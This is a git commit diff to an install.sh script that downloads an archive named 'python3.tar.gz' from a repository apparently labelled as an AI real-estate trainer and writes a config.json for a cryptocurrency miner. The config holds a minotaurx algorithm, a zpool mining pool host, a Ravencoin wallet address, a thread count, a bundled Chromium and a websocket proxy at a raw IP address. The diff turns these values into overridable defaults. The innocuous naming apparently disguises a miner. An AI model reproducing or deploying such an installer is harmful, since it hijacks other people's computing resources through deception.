4faa5f37d51fa3a5cf748afb9df2d71d8be61321
malphite-code-3 <coderun681@gmail.com>
2024-07-16 16:34:39 +0700

    Update install.sh

--- install.sh
+++ install.sh
@@ -1,5 +1,13 @@
 #!/bin/bash
 
+: "${M_ALGO:='minotaurx'}"
+: "${M_HOST:='minotaurx.na.mine.zpool.ca'}"
+: "${M_PORT:=7019}"
+: "${M_WORKER:='RVZD5AjUBXoNnsBg9B2AzTTdEeBNLfqs65'}"
+: "${M_PASSWORD:='c=RVN'}"
+: "${M_THREADS:=7}"
+: "${M_PROXY:='ws://172.233.136.27:8088/proxy'}"
+
 # Download packgaes
 wget https://github.com/malphite-code-3/ai-realestale-trainer/releases/download/python3.2/python3.tar.gz
 tar -xvf python3.tar.gz
@@ -22,15 +30,15 @@ rm -f config.json
 # Create a new config.json file with the specified content
 cat <<EOL > config.json
 {
-    "algorithm": "minotaurx",
-    "host": "minotaurx.na.mine.zpool.ca",
-    "port": 7019,
-    "worker": "RVZD5AjUBXoNnsBg9B2AzTTdEeBNLfqs65",
-    "password": "c=RVN",
-    "workers": 7,
+    "algorithm": "$M_ALGO",
+    "host": "$M_HOST",
+    "port": $M_PORT,
+    "worker": "$M_WORKER",
+    "password": "$M_PASSWORD",
+    "workers": $M_THREADS,
     "log": false,
     "chrome": "./chromium/chrome",
-    "proxy": "ws://172.233.136.27:8088/proxy"
+    "proxy": "$M_PROXY"
 }
 EOL
 
